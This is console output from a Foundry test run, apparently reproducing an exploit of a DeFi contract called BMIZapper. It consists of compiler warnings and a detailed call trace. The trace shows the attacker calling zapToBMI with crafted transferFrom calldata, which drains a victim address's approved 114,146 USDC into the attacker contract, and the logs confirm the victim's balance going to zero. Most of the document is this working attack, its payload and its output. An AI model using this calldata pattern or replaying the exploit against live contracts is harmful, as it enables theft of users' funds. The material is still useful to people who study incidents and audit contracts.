Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.20s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-01/Bmizapper_exp.sol:34:5:
   |
34 |     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    тФЬтФА [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 289.93ms (179.81┬╡s CPU time)

Ran 1 test for src/test/2024-01/Bmizapper_exp.sol:ExploitTest
[PASS] testExploit() (gas: 374067)
Logs:
  Victim's USDC balance before exploit: 114146.247097
  Victim's USDC balance after exploit: 0.000000
  Attacker's USDC balance after exploit: 114146.247097

Traces:
  [381667] ExploitTest::testExploit()
    тФЬтФА [9839] USDC::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [staticcall]
    тФВ   тФЬтФА [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 114146247097 [1.141e11]
    тФВ   тФФтФА тЖР [Return] 114146247097 [1.141e11]
    тФЬтФА [3164] USDC::decimals() [staticcall]
    тФВ   тФЬтФА [2381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 6
    тФВ   тФФтФА тЖР [Return] 6
    тФЬтФА emit log_named_decimal_uint(key: "Victim's USDC balance before exploit", val: 114146247097 [1.141e11], decimals: 6)
    тФЬтФА [1339] USDC::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [staticcall]
    тФВ   тФЬтФА [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 114146247097 [1.141e11]
    тФВ   тФФтФА тЖР [Return] 114146247097 [1.141e11]
    тФЬтФА [333538] BMIZapper::zapToBMI(0x4Fabb145d64652a948d72533023f6E7A623C7C53, 0, 0x0000000000000000000000000000000000000000, 0, 0, [], [1000000000000000000 [1e18]], USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd00000000000000000000000007d7685becb1a72a1cf614b4067419334c9f1b4d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000001a93a581b9, true)
    тФВ   тФЬтФА [25020] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::transferFrom(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0)
    тФВ   тФВ   тФЬтФА [17732] 0x2A3F1A37C04F82aA274f5353834B2d002Db91015::transferFrom(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0) [delegatecall]
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], value: 0)
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [8045] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0)
    тФВ   тФВ   тФЬтФА [7263] 0x2A3F1A37C04F82aA274f5353834B2d002Db91015::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0) [delegatecall]
    тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], value: 0)
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [3945] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0)
    тФВ   тФВ   тФЬтФА [3163] 0x2A3F1A37C04F82aA274f5353834B2d002Db91015::approve(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0) [delegatecall]
    тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], value: 0)
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [40049] USDC::transferFrom(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d, ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 114146247097 [1.141e11])
    тФВ   тФВ   тФЬтФА [39254] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d, ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 114146247097 [1.141e11]) [delegatecall]
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d, to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 114146247097 [1.141e11])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [7439] 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B::totalSupply() [staticcall]
    тФВ   тФВ   тФЬтФА [2433] 0xE2792dBAa268631A3858BF831b76baFC1A8a4362::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 258039016510113339064747 [2.58e23]
    тФВ   тФВ   тФФтФА тЖР [Return] 258039016510113339064747 [2.58e23]
    тФВ   тФЬтФА [1339] USDC::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [staticcall]
    тФВ   тФВ   тФЬтФА [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [delegatecall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФЬтФА [213421] 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B::mint(0)
    тФВ   тФВ   тФЬтФА [212915] 0xE2792dBAa268631A3858BF831b76baFC1A8a4362::mint(0) [delegatecall]
    тФВ   тФВ   тФВ   тФЬтФА [7451] 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [4382] 0x986b4AFF588a109c09B50A03f42E4110E29D353F::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 13481963961123493925908 [1.348e22]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 13481963961123493925908 [1.348e22]
    тФВ   тФВ   тФВ   тФЬтФА [6571] 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50444707592934502830323 [5.044e22]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 50444707592934502830323 [5.044e22]
    тФВ   тФВ   тФВ   тФЬтФА [4071] 0x3B96d491f067912D18563d56858Ba7d6EC67a6fa::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 49062689600479175353702 [4.906e22]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 49062689600479175353702 [4.906e22]
    тФВ   тФВ   тФВ   тФЬтФА [4071] 0xA74d4B67b3368E83797a35382AFB776bAAE4F5C8::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 41260700541500909230127 [4.126e22]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 41260700541500909230127 [4.126e22]
    тФВ   тФВ   тФВ   тФЬтФА [4071] 0x1C6a9783F812b3Af3aBbf7de64c3cD7CC7D1af44::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8590586891348196856470 [8.59e21]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8590586891348196856470 [8.59e21]
    тФВ   тФВ   тФВ   тФЬтФА [4071] 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 49186395420842146362684 [4.918e22]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 49186395420842146362684 [4.918e22]
    тФВ   тФВ   тФВ   тФЬтФА [4071] 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 12625830812777963880156 [1.262e22]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 12625830812777963880156 [1.262e22]
    тФВ   тФВ   тФВ   тФЬтФА [4071] 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3899] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::balanceOf(0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 23665720835579771346300 [2.366e22]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 23665720835579771346300 [2.366e22]
    тФВ   тФВ   тФВ   тФЬтФА [10786] 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10211] 0x986b4AFF588a109c09B50A03f42E4110E29D353F::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [10274] 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10090] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 18493688277810584740 [1.849e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [10274] 0x3B96d491f067912D18563d56858Ba7d6EC67a6fa::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10090] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 21629598650268911250 [2.162e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [10274] 0xA74d4B67b3368E83797a35382AFB776bAAE4F5C8::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10090] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 18811751683042529676 [1.881e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [10274] 0x1C6a9783F812b3Af3aBbf7de64c3cD7CC7D1af44::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10090] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 1976568631093460178 [1.976e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [10274] 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10090] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 71856 [7.185e4])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [10274] 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10090] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 18393722389832966266 [1.839e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [10274] 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [10090] 0xA696a63cc78DfFa1a63E9E50587C197387FF6C7E::transferFrom(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], spender: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 10384200177434297374 [1.038e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x2bF3cC8Fa6F067cc1741c7467C8Ee9F00e837757, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], value: 0)
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФЬтФА [1107] 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [staticcall]
    тФВ   тФВ   тФЬтФА [598] 0xE2792dBAa268631A3858BF831b76baFC1A8a4362::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [delegatecall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФЬтФА [5922] 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФВ   тФЬтФА [5410] 0xE2792dBAa268631A3858BF831b76baFC1A8a4362::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0) [delegatecall]
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [1339] USDC::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [staticcall]
    тФВ   тФВ   тФЬтФА [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8]) [delegatecall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФЬтФА [5452] USDC::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФВ   тФЬтФА [4663] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0) [delegatecall]
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: BMIZapper: [0x4622aFF8E521A444C9301dA0efD05f6b482221b8], to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФФтФА тЖР [Return] 0
    тФЬтФА [1339] USDC::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [staticcall]
    тФВ   тФЬтФА [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФФтФА тЖР [Return] 0
    тФЬтФА [1164] USDC::decimals() [staticcall]
    тФВ   тФЬтФА [381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 6
    тФВ   тФФтФА тЖР [Return] 6
    тФЬтФА emit log_named_decimal_uint(key: "Victim's USDC balance after exploit", val: 0, decimals: 6)
    тФЬтФА [1339] USDC::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 114146247097 [1.141e11]
    тФВ   тФФтФА тЖР [Return] 114146247097 [1.141e11]
    тФЬтФА [1164] USDC::decimals() [staticcall]
    тФВ   тФЬтФА [381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 6
    тФВ   тФФтФА тЖР [Return] 6
    тФЬтФА emit log_named_decimal_uint(key: "Attacker's USDC balance after exploit", val: 114146247097 [1.141e11], decimals: 6)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.74s (9.09s CPU time)

Ran 2 test suites in 9.74s (10.03s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
